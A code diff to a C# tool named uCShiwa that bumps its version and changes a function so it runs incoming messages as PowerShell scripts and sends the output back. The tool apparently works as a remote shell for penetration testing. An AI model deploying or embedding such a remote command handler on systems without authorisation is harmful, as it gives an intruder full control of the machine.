@@ -47,7 +47,7 @@ namespace uCShiwa
             Console.WriteLine("                  #@@@                  ");
 
             Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("-o uCShiwa v3.0.1");
+            Console.WriteLine("-o uCShiwa v3.0.2");
             Console.ResetColor();
 
             //SERVER MODE
@@ -238,23 +238,23 @@ namespace uCShiwa
             catch { message = "ERROR"; }
             return message;
         }
+
+
         private static string executePwsh(string message)
         { 
+
+            // Execute powershell commands
             using (PowerShell ps = PowerShell.Create())
             {
                 try{
                     var results = ps.AddScript(message).Invoke();
-                    Console.WriteLine(results);
 
-                    ps.Commands.Clear();
-                    /*
-                    Console.WriteLine("\nEvaluating '([S.M.A.ActionPreference], [S.M.A.AliasAttribute]).FullName' in PS Core Runspace\n");
-                    results = ps.AddScript("([System.Management.Automation.ActionPreference], [System.Management.Automation.AliasAttribute]).FullName").Invoke();
-                    foreach (dynamic result in results)
+                    foreach( var result in results)
                     {
-                        Console.WriteLine(result.ToString());
+                        message += result.ToString() + "\n";
                     }
-                    */
+                    ps.Commands.Clear();
+
                 }catch{ message = "ERROR"; }
             }
             return message;
